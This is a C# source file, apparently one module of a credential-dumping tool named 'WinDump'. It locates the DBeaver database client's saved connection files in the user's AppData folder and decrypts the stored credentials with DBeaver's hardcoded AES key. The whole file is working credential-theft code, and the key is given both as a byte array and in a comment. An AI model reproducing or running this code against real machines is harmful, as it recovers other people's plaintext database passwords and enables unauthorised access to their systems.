using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace WinDump
{
    internal class DBeaver
    {
        internal static string Decrypt(string filePath, byte[] key, byte[] iv)
        {
            byte[] encryptedBytes = File.ReadAllBytes(filePath);
            
            using (var aes = new RijndaelManaged())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (MemoryStream memoryStream = new MemoryStream(encryptedBytes))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
                    {
                        var skip = new byte[16];
                        cryptoStream.Read(skip, 0, 16);
                        using (StreamReader streamReader = new StreamReader(cryptoStream, Encoding.UTF8))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }
        internal static string GetDBeaver()
        {
            var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DBeaverData");
            if (!Directory.Exists(path))
            {
                return "";
            }
            var sourcePath = Path.Combine(path, "workspace6\\General\\.dbeaver\\data-sources.json");
            var sources = "";
            if (File.Exists(sourcePath)) { 
                sources = File.ReadAllText(sourcePath);
            }
            var credsPath = Path.Combine(path, "workspace6\\General\\.dbeaver\\credentials-config.json");
            var creds = "";
            if (File.Exists(credsPath))
            {
                // "babb4a9f774ab853c96c2d653dfe544a", "00000000000000000000000000000000"
                var key = new byte[] { 0xBA, 0xBB, 0x4A, 0x9F, 0x77, 0x4A, 0xB8, 0x53, 0xC9, 0x6C, 0x2D, 0x65, 0x3D, 0xFE, 0x54, 0x4A };
                var iv = new byte[16];
                try
                {
                    creds = Decrypt(credsPath, key, iv);
                }
                catch { }
            }
            return sources + "\n" + creds;
        }
    }
}
